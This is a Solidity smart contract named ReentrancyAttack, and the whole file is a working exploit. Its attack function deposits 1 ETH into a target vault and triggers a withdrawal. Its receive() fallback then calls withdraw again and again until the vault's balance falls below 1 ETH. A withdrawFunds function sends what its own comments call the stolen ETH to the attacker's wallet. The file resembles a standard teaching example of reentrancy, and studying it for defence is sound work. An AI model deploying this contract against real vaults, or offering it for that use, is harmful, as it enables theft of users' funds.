// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

/// @title ReentrancyAttack
/// @notice Exploits a reentrancy vulnerability in a target vault
/// @dev Stores stolen ETH, which can later be withdrawn by the attacker (owner)
contract ReentrancyAttack {
    address public owner;
    IVault public vault;

    /// @param _vault Address of the vulnerable vault
    constructor(address _vault) {
        owner = msg.sender;
        vault = IVault(_vault);
    }

    /// @notice Starts the attack by depositing ETH and triggering the first withdrawal
    function attack() external payable {
        require(msg.value >= 1 ether, "Send at least 1 ETH");
        vault.deposit{value: 1 ether}();
        vault.withdraw();
    }

    /// @notice Fallback function that recursively calls withdraw while vault has funds
    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }

    /// @notice Withdraws all ETH from this contract to the attacker's wallet
    function withdrawFunds() external {
        require(msg.sender == owner, "Not the owner");
        payable(owner).transfer(address(this).balance);
    }
}
